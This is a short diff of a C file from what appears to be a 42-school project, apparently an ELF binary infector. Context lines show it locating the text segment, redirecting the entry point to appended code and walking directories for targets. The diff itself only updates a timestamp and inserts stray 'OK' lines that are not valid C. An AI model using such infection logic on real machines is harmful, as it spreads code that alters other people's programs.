@@ -6,7 +6,7 @@
 /*   By: fcadet <fcadet@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2022/07/22 12:32:02 by fcadet            #+#    #+#             */
-/*   Updated: 2022/07/25 13:27:09 by fcadet           ###   ########.fr       */
+/*   Updated: 2022/07/26 12:29:02 by fcadet           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -166,6 +166,7 @@ static int		find_txt_seg(void) {
 	return (0);
 }
 
+OK
 static int		set_x_pad(void) {
 	Elf64_Phdr	*p_hdr;
 	Elf64_Shdr	*s_hdr;
@@ -188,6 +189,7 @@ static int		set_x_pad(void) {
 	return (0);
 }
 
+OK
 static void		update_mem(void) {
 	sc_entry = hdrs.txt->p_vaddr + hdrs.txt->p_memsz;
 	sc_real_entry = hdrs.elf->e_entry;
@@ -196,6 +198,7 @@ static void		update_mem(void) {
 	hdrs.txt->p_memsz += sz.load;
 }
 
+OK
 static void		proc_entries(uint64_t dir_ret, char *root_path) {
 	uint16_t		ent_sz;
 	uint8_t			*ent_ptr;
@@ -219,6 +222,7 @@ static void		proc_entries(uint64_t dir_ret, char *root_path) {
 	}
 }
 
+OK
 static void		proc_dir(char *dir) {
 	int				dir_fd;
 	int64_t			dir_ret;
@@ -230,6 +234,7 @@ static void		proc_dir(char *dir) {
 	close(dir_fd);
 }
 
+OK
 int		main(void) {
 	//bzero glob vars
 	
